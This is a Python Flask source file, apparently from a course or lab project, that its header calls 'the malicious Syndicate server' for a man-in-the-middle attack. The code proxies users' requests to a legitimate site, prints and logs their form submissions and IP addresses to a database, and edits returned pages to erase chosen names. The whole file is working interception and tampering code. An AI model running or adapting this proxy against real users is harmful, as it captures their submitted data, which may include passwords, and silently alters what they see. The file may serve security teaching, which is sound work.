"""
The malicious Syndicate server for conducting the man-in-the-middle attack

Authors: Joe MacInnes and Dylan Orris
"""
from flask import Flask, Response, redirect, url_for, request, session, abort, g
import requests, sqlite3, os

app = Flask(__name__)

# The url of the legitimate server
senate_server = "http://wooster.edu"
app.config.update(dict(
    DEBUG=False,
    SECRET_KEY='this_is_the_malicious_server',
    DATABASE=os.path.join(app.root_path, 'syndicate.db')
))


@app.route('/', methods=["GET", "POST"])
def home():
    '''
    The base URL handles all the forwarding of requests from the client to the legitimate server
    '''
    # Behaviour for a POST request
    if request.method == 'POST':
        keys = [key for key in request.form]
        payload = {}
        for request_key in keys:
            payload[request_key] = request.form[request_key]
        print(payload)
        resp = requests.post(session['last_url'], data = payload)
        record(resp.text, request.remote_addr)

    # Behaviour for a GET request
    else:
        # If this is the first request go to the base url of the legitimate server
        if session.get('last_url') is None:
            resp = requests.get(senate_server)
        else:
            resp = requests.get(session['last_url'])

    # Remember what URL to send the next request to
    session['last_url'] = resp.url
    # Forward the received response to the client
    content = resp.text
    # Scrub the text of whitelisted names
    for row in get_spies():
        content = content.replace((dict(row))['name'], 'no one')
    return content


def get_spies():
    """Returns the spy info for all spies."""
    cur = get_db().cursor()
    query = 'SELECT * FROM syndicate_spies'
    cur.execute(query)
    return cur.fetchall()

def record(text, ip):
    """ Inserts eavesdropped info into a database """

    query = 'INSERT INTO access_log VALUES (?, ?)'
    cur = get_db().cursor()
    cur.execute(query, [str(text), str(ip)])
    get_db().commit()
    return cur.lastrowid

def connect_db():
    """Returns a connection object associated with a database file."""
    conn = sqlite3.connect(app.config['DATABASE'])
    # make rows returned by queries have index/name-based access to columns
    conn.row_factory = sqlite3.Row
    return conn


def get_db():
    """Opens a new database connection if there is none yet for the
    current connection."""
    if not hasattr(g, 'sqlite_db'):
        g.sqlite_db = connect_db()
    return g.sqlite_db

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=12346)




